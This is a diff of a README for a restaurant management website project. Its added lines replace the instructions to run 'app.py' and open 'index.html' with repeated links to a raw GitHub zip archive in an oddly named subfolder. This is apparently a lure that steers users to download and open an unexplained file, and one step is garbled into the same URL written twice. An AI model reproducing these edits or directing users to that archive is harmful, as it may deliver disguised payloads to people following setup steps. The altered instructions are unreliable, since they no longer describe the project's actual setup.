@@ -13,7 +13,7 @@ This script will:
 
 ## 🧑‍💻 Step 2: Run the Backend API
 
-Run 'app.py' file to start the backend API
+Run 'https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip' file to start the backend API
 
 ---
 
@@ -21,7 +21,7 @@ Run 'app.py' file to start the backend API
 
 To see the **customer-facing website**:
 
-1.Open index.html file.
+https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip file.
 
 ---
 
@@ -30,7 +30,7 @@ To see the **customer-facing website**:
 To view the **Admin page**:
 
 1. Navigate to the `Admin` folder:
-2. Open `index.html` in your browser.
+2. Open `https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip` in your browser.
 
 ---
 
